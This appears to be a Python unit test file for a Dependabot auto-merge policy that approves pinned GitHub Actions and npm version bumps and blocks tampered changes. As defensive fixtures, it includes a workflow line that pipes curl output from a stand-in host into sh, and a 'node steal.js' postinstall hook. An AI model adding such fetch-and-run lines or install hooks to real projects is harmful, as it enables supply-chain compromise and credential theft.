from __future__ import annotations

import json
import unittest

from scripts.dependabot_policy import (
    BAOYU_PACKAGE_JSON,
    REVIEWED_ACTIONS_PATH,
    ChangedFile,
    DependabotSnapshot,
    evaluate,
    render_reviewed_actions,
)

REPOSITORY = "kwhi6693-web/presentation-studio"
APP = "presentation-studio-upstream-sync[bot]"
HEAD = "b" * 40
OLD = "5fda3b95a4ea91299a34e894583c3862153e4b97"
NEW = "6d4fd22b20465ccc0f7354476588e8df7c9ca0e0"
BASE_REVIEWED = {
    "actions/checkout": {"commit": "3" * 40, "release": "v7.0.1", "uses": 6},
    "actions/setup-python": {"commit": OLD, "release": "v7.0.0", "uses": 5},
}
RECORDED = json.loads(json.dumps(BASE_REVIEWED))
RECORDED["actions/setup-python"].update({"commit": NEW, "release": "v7.1.0"})

PIN_PATCH = (
    "@@ -10,3 +10,3 @@\n"
    "       - uses: actions/checkout@" + "3" * 40 + " # v7.0.1\n"
    "-      - uses: actions/setup-python@" + OLD + " # v7.0.0\n"
    "+      - uses: actions/setup-python@" + NEW + " # v7.1.0\n"
)
GREEN = (("verify", "success"), ("checks (ubuntu-latest, Python 3.12)", "success"))
BASE_PACKAGE = {
    "name": "baoyu",
    "scripts": {"build": "tsx build.ts"},
    "dependencies": {"sharp": "^0.35.4"},
    "overrides": {"image-size": "^2.1.0"},
}


def tags(action: str, release: str) -> str | None:
    return {("actions/setup-python", "v7.1.0"): NEW}.get((action, release))


def actions_pr(**overrides) -> DependabotSnapshot:
    values = dict(
        number=48,
        state="open",
        draft=False,
        base_ref="main",
        base_repository=REPOSITORY,
        head_repository=REPOSITORY,
        head_ref="dependabot/github_actions/github-actions-abc123",
        head_sha=HEAD,
        author_login="dependabot[bot]",
        files=(ChangedFile(".github/workflows/validate.yml", "modified", PIN_PATCH),),
        commit_identities=(("dependabot[bot]", "web-flow"),),
        check_runs=GREEN,
        mergeable=True,
        mergeable_state="clean",
        head_texts={REVIEWED_ACTIONS_PATH: json.dumps(RECORDED)},
        base_texts={REVIEWED_ACTIONS_PATH: json.dumps(BASE_REVIEWED)},
    )
    values.update(overrides)
    return DependabotSnapshot(**values)


def npm_pr(head_package: dict, **overrides) -> DependabotSnapshot:
    values = dict(
        head_ref="dependabot/npm_and_yarn/presentation-studio/engines/baoyu/sharp-0.35.5",
        files=(
            ChangedFile(BAOYU_PACKAGE_JSON, "modified", "@@\n-x\n+y\n"),
            ChangedFile("presentation-studio/engines/baoyu/package-lock.json", "modified", None),
        ),
        head_texts={BAOYU_PACKAGE_JSON: json.dumps(head_package)},
        base_texts={BAOYU_PACKAGE_JSON: json.dumps(BASE_PACKAGE)},
    )
    values.update(overrides)
    return actions_pr(**values)


def decide(pr: DependabotSnapshot):
    return evaluate(
        pr, repository=REPOSITORY, app_login=APP, expected_head_sha=HEAD, resolve_tag=tags
    )


class ActionsUpdateTests(unittest.TestCase):
    def test_verified_pin_without_record_asks_to_record_it(self) -> None:
        decision = decide(
            actions_pr(
                head_texts={REVIEWED_ACTIONS_PATH: json.dumps(BASE_REVIEWED)},
                check_runs=(("verify", "failure"),),
            )
        )

        self.assertEqual(decision.action, "record-pins")
        self.assertEqual(json.loads(decision.reviewed_actions), RECORDED)
        self.assertEqual(decision.reviewed_actions, render_reviewed_actions(RECORDED))

    def test_recorded_pin_with_green_checks_merges(self) -> None:
        decision = decide(
            actions_pr(commit_identities=(("dependabot[bot]", "web-flow"), (APP, APP)))
        )

        self.assertEqual(decision.action, "merge")

    def test_pin_that_does_not_match_the_release_tag_blocks(self) -> None:
        bad = PIN_PATCH.replace(NEW, "c" * 40)
        decision = decide(
            actions_pr(files=(ChangedFile(".github/workflows/validate.yml", "modified", bad),))
        )

        self.assertEqual(decision.action, "block")
        self.assertIn("does not match", decision.reason)

    def test_unresolvable_tag_blocks(self) -> None:
        patch = PIN_PATCH.replace("v7.1.0", "v9.9.9")
        decision = decide(
            actions_pr(files=(ChangedFile(".github/workflows/validate.yml", "modified", patch),))
        )

        self.assertEqual(decision.action, "block")

    def test_unapproved_action_blocks(self) -> None:
        patch = PIN_PATCH.replace("actions/setup-python", "actions/cache")

        def resolver(action: str, release: str) -> str:
            return NEW

        decision = evaluate(
            actions_pr(files=(ChangedFile(".github/workflows/validate.yml", "modified", patch),)),
            repository=REPOSITORY,
            app_login=APP,
            expected_head_sha=HEAD,
            resolve_tag=resolver,
        )

        self.assertEqual(decision.action, "block")
        self.assertIn("not approved", decision.reason)

    def test_any_non_pin_workflow_line_blocks(self) -> None:
        patch = PIN_PATCH + "+        run: curl https://example.invalid | sh\n"
        decision = decide(
            actions_pr(files=(ChangedFile(".github/workflows/validate.yml", "modified", patch),))
        )

        self.assertEqual(decision.action, "block")

    def test_non_workflow_file_blocks(self) -> None:
        decision = decide(
            actions_pr(
                files=(
                    ChangedFile(".github/workflows/validate.yml", "modified", PIN_PATCH),
                    ChangedFile("scripts/build_package.py", "modified", "@@\n-a\n+b\n"),
                )
            )
        )

        self.assertEqual(decision.action, "block")

    def test_unexpected_reviewed_actions_content_blocks(self) -> None:
        tampered = json.loads(json.dumps(RECORDED))
        tampered["actions/checkout"]["commit"] = "d" * 40
        decision = decide(actions_pr(head_texts={REVIEWED_ACTIONS_PATH: json.dumps(tampered)}))

        self.assertEqual(decision.action, "block")
        self.assertIn("unexpected content", decision.reason)

    def test_commit_from_a_person_blocks(self) -> None:
        decision = decide(
            actions_pr(commit_identities=(("dependabot[bot]", "web-flow"), ("someone", "web-flow")))
        )

        self.assertEqual(decision.action, "block")

    def test_running_checks_wait_and_failed_checks_block(self) -> None:
        self.assertEqual(
            decide(actions_pr(check_runs=(("verify", "in_progress"),))).action, "wait"
        )
        self.assertEqual(
            decide(actions_pr(check_runs=(("verify", "success"), ("checks", "failure")))).action,
            "block",
        )

    def test_behind_branch_updates_and_unknown_waits(self) -> None:
        self.assertEqual(decide(actions_pr(mergeable_state="behind")).action, "update")
        self.assertEqual(
            decide(actions_pr(mergeable=None, mergeable_state="unknown")).action, "wait"
        )

    def test_non_dependabot_or_stale_head_is_ignored(self) -> None:
        self.assertEqual(decide(actions_pr(author_login="someone")).action, "ignore")
        self.assertEqual(decide(actions_pr(head_sha="e" * 40)).action, "ignore")


class NpmUpdateTests(unittest.TestCase):
    def test_dependency_version_change_merges(self) -> None:
        head = json.loads(json.dumps(BASE_PACKAGE))
        head["dependencies"]["sharp"] = "^0.35.5"

        self.assertEqual(decide(npm_pr(head)).action, "merge")

    def test_script_change_blocks(self) -> None:
        head = json.loads(json.dumps(BASE_PACKAGE))
        head["scripts"]["postinstall"] = "node steal.js"

        decision = decide(npm_pr(head))
        self.assertEqual(decision.action, "block")
        self.assertIn("beyond dependency versions", decision.reason)

    def test_new_dependency_blocks(self) -> None:
        head = json.loads(json.dumps(BASE_PACKAGE))
        head["dependencies"]["left-pad"] = "^1.0.0"

        self.assertEqual(decide(npm_pr(head)).action, "block")

    def test_file_outside_baoyu_blocks(self) -> None:
        head = json.loads(json.dumps(BASE_PACKAGE))
        decision = decide(
            npm_pr(head, files=(ChangedFile("package.json", "modified", "@@\n-a\n+b\n"),))
        )

        self.assertEqual(decision.action, "block")

    def test_other_ecosystem_blocks(self) -> None:
        decision = decide(actions_pr(head_ref="dependabot/pip/requests-2.0"))

        self.assertEqual(decision.action, "block")


if __name__ == "__main__":
    unittest.main()
